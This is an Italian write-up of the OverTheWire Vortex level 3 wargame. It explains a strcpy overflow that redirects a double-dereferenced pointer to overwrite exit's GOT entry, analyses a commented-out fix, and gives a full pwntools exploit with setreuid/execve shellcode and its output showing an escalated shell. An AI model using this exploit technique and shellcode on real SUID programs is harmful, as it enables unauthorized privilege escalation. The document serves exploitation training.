@@ -1,0 +1,262 @@
+Vortex3 ~ HCF
+
+CTF OverTheWire: GOT overwrite via doppia dereferenziazione controllata
+
+section .INTRODUZIONE
+
+;negli ultimi tempi ho deciso di riprendere in mano alcune vecchie serie di wargame, tra cui Vortex di OverTheWire, che ritrovo ancora allenanti. Le ho riprese per allenamento personale e per consolidare le basi del reversing e dell'exploitation, in un momento storico in cui sembra sempre più diffondersi la tendenza a delegare all'intelligenza artificiale anche i processi cognitivi più elementari, spesso prima ancora di aver provato a farli propri. Certe conoscenze, del resto, mantengono il proprio valore nel tempo, anche quando lo stack tecnologico sottostante e' evoluto: capire come funziona una GOT overwrite o una write-what-where resta utile ben oltre l'architettura specifica su cui la si e' studiata la prima volta.
+
+section .METADATI
+
+- tipologia: local privilege escalation, binary exploitation
+- architettura: ELF 32-bit LSB, Intel i386, dynamically linked, interprete /lib/ld-linux.so.2
+- strumenti: gdb, objdump, strace, python3, pwntools, radare2
+- famiglia: wargame didattico, serie Vortex (OverTheWire)
+- variante: vortex3
+- denominazione interna: GOT overwrite via doppia dereferenziazione controllata
+
+_Nota_Metodologica:
+
+;l'analisi e' stata condotta a mano tramite disassemblatori statici (radare2, objdump), debugger interattivo (gdb) e tracing delle syscall (strace). L'intelligenza artificiale e' stata utilizzata esclusivamente nella fase finale del lavoro, come supporto all'analisi: per validare alcune ipotesi interpretative, per effettuare una revisione degli errori sul materiale gia' analizzato e in parte per la stesura del presente write-up.
+
+section .EXECUTIVE_SUMMARY
+
+;il binario vortex3 e' un eseguibile SUID appartenente a vortex4, eseguibile dal gruppo vortex3. Contiene una funzione main vulnerabile a buffer overflow su strcpy, ma il vettore di sfruttamento reale non e' l'overflow classico dell'indirizzo di ritorno: e' la scrittura, tramite un puntatore a puntatore globale, di un valore arbitrario controllato dall'attaccante. Questo consente una primitiva write-what-where che viene puntata sulla GOT della funzione exit. La conseguenza e' il trasferimento del controllo allo shellcode al posto della normale destinazione di exit(), con conseguente escalation a UID 5004.
+
+section .CODICE_SORGENTE
+
+;codice della CTF: vortex3.c
+
+
+/*
+ * 0xbadc0ded.org Challenge #02 (2003-07-08)
+ *
+ * Joel Eriksson <je@0xbadc0ded.org>
+ */
+
+#include <string.h>
+#include <stdlib.h>
+#include <stdio.h>
+
+unsigned long val = 31337;
+unsigned long *lp = &val;
+
+int main(int argc, char **argv)
+{
+        unsigned long **lpp = &lp, *tmp;
+        char buf[128];
+
+        if (argc != 2)
+                exit(1);
+
+        strcpy(buf, argv[1]);
+
+        if (((unsigned long) lpp & 0xffff0000) != 0x08040000)
+                exit(2);
+
+        tmp = *lpp;
+        **lpp = (unsigned long) &buf;
+        // *lpp = tmp; // Fix suggested by Michael Weissbacher @mweissbacher 2013-06-30
+
+        exit(0);
+}
+
+section .ARCHITETTURA_GENERALE
+
+main()
+|
++-- strcpy(buf, argv[1]) ;overflow del buffer locale, nessun controllo sulla lunghezza
+|
++-- controllo su lpp & 0xffff0000 ;vincolo sull'indirizzo
+|
++-- tmp = *lpp
+|
++-- **lpp = &buf ;doppia dereferenziazione, primitiva di scrittura write-what-where
+|
++-- exit(0)
+|
++-- jmp [exit@GOT] ;salto indiretto tramite GOT
+|
++-- &buf ;shellcode eseguito al posto della funzione exit
+
+section .PROTEZIONI_BINARIE
+
+_Checksec_E_Assenza_Di_Mitigazioni:
+
+checksec --file=/vortex/vortex3
+
+RELRO: No RELRO
+Stack: No canary found
+NX: NX disabled
+PIE: No PIE (0x8048000)
+
+;No RELRO significa che le entry della GOT rimangono scrivibili durante l'esecuzione del processo. In particolare, GOT[exit] può essere modificata dalla primitiva di scrittura dell'exploit. Con Full RELRO, invece, la GOT viene resa read-only dopo le relocation, impedendo questo tipo di overwrite.
+
+;No canary found indica che nello stack frame non è presente un canary che possa rilevare l'overflow al momento del controllo previsto dal compilatore. In questo caso, quindi, l'overflow può raggiungere lpp senza incontrare un meccanismo di terminazione basato sul canary. Il canary non è però il fulcro dell'exploit: ciò che conta è la possibilità di sovrascrivere lpp prima che venga utilizzato.
+
+;NX disabled indica che lo stack è eseguibile e permette quindi di utilizzare direttamente &buf come indirizzo dello shellcode. La primitiva di GOT overwrite, presa isolatamente, non dipende da NX; tuttavia, con NX abilitato, questo payload specifico non potrebbe eseguire lo shellcode sullo stack. Sarebbe quindi necessario modificare la fase finale dell'exploit, ad esempio reindirizzando il controllo verso una regione di memoria eseguibile.
+
+;No PIE significa che gli indirizzi relativi all'eseguibile principale sono deterministici tra le esecuzioni. In particolare, exit@plt+2 (0x08049052) ed exit@GOT (0x0804b200) possono essere utilizzati senza la necessità di un information leak. Gli indirizzi delle librerie condivise possono invece continuare a essere soggetti ad ASLR.
+
+;l'assenza combinata di RELRO, canary e PIE trasforma un bug logico nel codice sorgente in una primitiva di exploitation completamente affidabile e ripetibile, senza bisogno di bruteforce o information leak.
+
+section .VETTORI_DI_ATTACCO
+
+_Buffer_Overflow_Su_strcpy:
+
+unsigned long **lpp = &lp, *tmp;
+char buf[128];
+strcpy(buf, argv[1]);
+
+;strcpy non verifica la lunghezza della stringa sorgente. argv[1] e' completamente controllato dall'attaccante. buf ha dimensione fissa 128 byte, ma lo stack frame consente overwrite oltre il buffer. l'overflow non serve a corrompere l'indirizzo di ritorno. Serve a sovrascrivere la variabile lpp, che risiede subito dopo buf nello stack frame, con un valore scelto dall'attaccante.
+
+_write-what-where_Tramite_Doppia_Dereferenziazione:
+
+tmp = *lpp;
+**lpp = (unsigned long) &buf;
+
+;lpp punta normalmente a lp, che punta a val. Se lpp viene sovrascritto con un indirizzo arbitrario X, il programma scrive &buf in *X. Questo trasforma un semplice puntatore globale in una primitiva write-what-where. Il controllo (lpp & 0xffff0000) == 0x08040000 limita il valore di lpp all'intervallo 0x08040000–0x0804ffff, che comprende le aree di memoria utilizzate dal binario. Non impedisce però di scegliere arbitrariamente una locazione all'interno di tale intervallo.
+
+_Overwrite_Della_GOT:
+
+objdump -R /vortex/vortex3
+
+0804b1fc R_386_JUMP_SLOT strcpy@GLIBC_2.0
+0804b200 R_386_JUMP_SLOT exit@GLIBC_2.0
+
+;exit@GOT si trova all'indirizzo 0x0804b200. È una relocation R_386_JUMP_SLOT associata alla chiamata di exit() tramite PLT.
+
+_Bypass_Del_Filtro_NULL_Byte:
+
+./vortex3 $(python3 -c '...')
+-bash: warning: command substitution: ignored null byte in input
+
+;argv[1] è una stringa C e non può contenere byte 0x00 interni: il primo 0x00 rappresenta infatti il terminatore della stringa. strcpy copia la stringa sorgente fino al suo terminatore, ma non è quindi possibile utilizzare un 0x00 come byte intermedio del payload. Questo vincolo, ulteriormente evidente quando il payload viene costruito tramite command substitution della shell, obbliga sia l'indirizzo utilizzato per sovrascrivere lpp sia lo shellcode a essere privi di byte nulli.
+
+_Bypass_Privilegi_Tramite_setreuid:
+
+strace -f -e trace=setuid,setreuid,setresuid /vortex/vortex3 ...
+setuid(5004) = -1 EPERM
+
+;il tentativo di utilizzare direttamente la syscall setuid ha prodotto EPERM nel test effettuato con strace. Poiché l'obiettivo dell'exploit è ottenere esplicitamente RUID ed EUID pari a 5004, ho scelto di utilizzare direttamente la syscall setreuid, specificando entrambi gli UID.
+
+xor eax, eax
+mov al, 0x46
+xor ebx, ebx
+mov bx, 0x138c
+xor ecx, ecx
+mov cx, 0x138c
+int 0x80
+
+;syscall 0x46 = setreuid, imposta sia RUID sia EUID. 0x138c = 5004 decimale, l'UID target del binario SUID. ebx = nuovo RUID, ecx = nuovo EUID, entrambi 5004. xor + mov parziale evita byte nulli nell'immediato, a differenza di un mov eax, 5004 diretto.
+
+;setreuid(ruid, euid) consente di specificare direttamente entrambi gli identificativi. Nel payload, ebx ed ecx vengono quindi caricati entrambi con 5004 (0x138c), rendendo esplicita la transizione verso l'identità privilegiata del livello vortex4.
+
+section .ASPETTI_TECNICI_RILEVANTI
+
+_Relazione_Tra_exit@plt_exit@GOT:
+
+0x08049050 exit@plt: jmp DWORD PTR ds:0x0804b200
+
+ff 25 00 b2 04 08
+
+;ff 25 e' l'opcode di jmp indiretto tramite indirizzo assoluto a 32 bit. I 4 byte successivi (00 b2 04 08) sono l'indirizzo della GOT in little-endian, cioe' 0x0804b200. L'indirizzo della GOT e' quindi codificato a partire dal terzo byte dell'istruzione, cioe' exit@plt+2. Da qui la scelta di 0x08049052 come target di lpp: quell'indirizzo, letto come dato, contiene il valore 0x0804b200, cioe' l'indirizzo reale della GOT di exit.
+
+_Catena_Di_Dereferenziazione_E_GOT_Overwrite:
+
+lpp = 0x08049052 ;indirizzo scelto, punta dentro l'istruzione jmp di exit@plt.
+*lpp = 0x0804b200 ;valore letto in quell'indirizzo, e' l'indirizzo della GOT.
+**lpp = *(0x0804b200) ;valore presente nella GOT di exit. 
+
+;la GOT contiene la destinazione utilizzata dal jmp presente in exit@plt. La scelta di lpp = exit@plt+2 fa sì che *lpp venga interpretato come l'indirizzo della GOT di exit; di conseguenza, l'istruzione **lpp = &buf scrive direttamente &buf nella entry GOT[exit]. Quando il programma esegue successivamente exit(0), il jmp presente in exit@plt utilizza il valore appena scritto e trasferisce il controllo al buffer contenente lo shellcode.
+
+_Calcolo_Dell'_Offset_E_Struttura_Del_Payload:
+
+payload = shellcode + b"A" * (132 - len(shellcode)) + p32(0x08049052)
+
+;offset 132 determinato empiricamente con debugging e confermato tramite GDB. L'ultimo p32 sovrascrive lpp con l'indirizzo 0x08049052, cioe' exit@plt+2.
+
+section .ANALISI_DEL_FIX_COMMENTATO
+
+_Perche'_Il_Fix_Suggerito_Non_Risolve_Il_Problema:
+
+tmp = *lpp;
+**lpp = (unsigned long) &buf;
+// *lpp = tmp;
+
+;tmp viene assegnato prima della scrittura arbitraria e contiene il valore letto in *lpp, cioe' il contenuto della cella puntata da lpp al momento dell'esecuzione. Nel caso dell'exploit, lpp punta a exit@plt+2 (0x08049052), quindi tmp contiene 0x0804b200, l'indirizzo della GOT di exit.
+
+;la scrittura pericolosa avviene sulla riga precedente, tramite **lpp, non tramite *lpp. **lpp scrive &buf all'indirizzo contenuto in *lpp, cioe' in 0x0804b200, la cella GOT stessa. E' questa la cella corrotta, non la cella puntata direttamente da lpp.
+
+;il fix commentato *lpp = tmp riscriverebbe 0x0804b200 nell'indirizzo 0x08049052, cioe' esattamente il valore che vi si trovava gia' prima di qualsiasi operazione. Quella cella (exit@plt+2, l'istruzione jmp) non viene mai alterata dall'exploit, quindi il fix agisce su un dato che non e' mai stato corrotto.
+
+;la cella realmente compromessa, 0x0804b200, non viene mai toccata dal fix. Il valore malevolo &buf resta scritto in GOT anche dopo l'esecuzione di *lpp = tmp, perche' quella riga non ha alcuna relazione con l'indirizzo GOT, ma solo con l'indirizzo di lpp stesso.
+
+;il fix commentato nasce probabilmente da un modello mentale in cui tmp salva il valore originale della locazione che si intende modificare, per poi ripristinarla dopo l'uso. Questo modello sarebbe corretto se la scrittura avvenisse tramite una singola dereferenziazione; qui però la scrittura avviene tramite una doppia dereferenziazione. tmp salva quindi il valore intermedio che identifica il bersaglio, non il contenuto della locazione che verrà effettivamente sovrascritta.
+
+section .EXPLOIT
+
+#!/usr/bin/env python3
+from pwn import *
+
+context.arch = "i386"
+context.os = "linux"
+
+BINARY = "/vortex/vortex3"
+
+OFFSET = 132
+lpp = 0x08049052
+
+shellcode = asm("""
+    xor eax, eax
+    mov al, 0x46
+    xor ebx, ebx
+    mov bx, 0x138c
+    xor ecx, ecx
+    mov cx, 0x138c
+    int 0x80
+
+    xor eax, eax
+    mov al, 0xb
+    xor edx, edx
+    push edx
+    push 0x68732f2f
+    push 0x6e69622f
+    mov ebx, esp
+    push edx
+    push ebx
+    mov ecx, esp
+    int 0x80
+""")
+
+log.info(f"shellcode length: {len(shellcode)}")
+log.info(f"shellcode: {shellcode.hex()}")
+
+assert len(shellcode) <= OFFSET
+assert b"\x00" not in shellcode
+
+payload = (
+    shellcode +
+    b"A" * (OFFSET - len(shellcode)) +
+    p32(lpp)
+)
+
+log.info(f"payload length: {len(payload)}")
+log.info(f"lpp: {hex(lpp)}")
+
+io = process([BINARY, payload])
+io.interactive()
+
+vortex3@vortex:~$ python3 /tmp/bz.py
+[*] shellcode length: 43
+[*] shellcode: 31c0b04631db66bb8c1331c966b98c13cd8031c0b00b31d252682f2f7368682f62696e89e3525389e1cd80
+[*] payload length: 136
+[*] lpp: 0x8049052
+[+] Starting local process '/vortex/vortex3': pid 111
+[*] Switching to interactive mode
+$ id
+uid=5004(vortex4) gid=5003(vortex3) groups=5003(vortex3)
+
+section .NOTE_FINALI
+
+;l'aspetto didattico principale di vortex3 non e' il buffer overflow in se', ma il fatto che il programma offra gia' una primitiva write-what-where tramite **lpp = &buf. Il lavoro dell'attaccante si riduce a scegliere correttamente il valore di lpp, sfruttando la conoscenza della codifica dell'istruzione jmp in exit@plt per individuare una cella di memoria che, letta come dato, contiene l'indirizzo della GOT. Il vincolo sui NULL byte nell'input, imposto dalla natura delle stringhe C utilizzate da strcpy, ha condizionato sia la scelta dell'indirizzo target sia la costruzione dello shellcode. Nella fase di privilege escalation ho quindi scelto setreuid, impostando esplicitamente RUID ed EUID a 5004.
